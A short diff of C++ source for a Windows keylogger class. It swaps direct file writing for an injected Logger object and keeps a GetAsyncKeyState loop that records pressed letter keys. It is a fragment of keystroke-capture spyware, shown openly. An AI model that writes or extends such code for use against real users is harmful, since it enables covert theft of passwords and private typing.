@@ -5,12 +5,8 @@
 
 using namespace std;
 
-KeyLogger::KeyLogger(string filepath) {
-	this->logFile.open(filepath);
-}
-
-KeyLogger::~KeyLogger() {
-	this->logFile.close();
+KeyLogger::KeyLogger(Logger* logger) {
+	this->logger = logger;
 }
 
 void KeyLogger::StartLogging() {
@@ -23,8 +19,7 @@ void KeyLogger::StartLogging() {
 		for (char i = 'A'; i <= 'Z'; i++) {
 			if (GetAsyncKeyState(i) == pressedState) 
 			{ 
-				cout << (i);
-				logFile << i;
+				this->logger->Write(i);
 			}
 		}
 	}
